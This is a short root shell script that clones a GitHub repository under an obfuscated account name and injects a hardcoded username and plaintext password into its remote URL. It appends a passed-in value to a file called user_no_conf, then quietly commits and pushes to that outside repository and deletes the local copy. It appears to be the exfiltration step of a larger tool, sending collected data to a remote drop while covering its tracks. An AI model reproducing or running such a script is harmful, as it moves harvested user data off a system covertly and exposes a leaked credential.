cd /root/
#rm -rf c0da/
git clone --quiet https://github.com/5y5l0g0x8/l00k.git
cd /root/l00k
sed -i "s/github/5y5l0g0x8:yepyepbaba123A*@github/" /root/l00k/.git/config
#cp /root/user_done /root/l00k/

echo $1 >>  /root/l00k/user_no_conf
#cp /root/user_no_conf /root/l00k/
git config --global user.email 5y5l0g0x8@s00kag3imb.tk
echo `date` >> time_statu && git add --all && git commit -m "l00000 da v1" && git push --quiet origin master
cd /root/
rm -rf /root/l00k
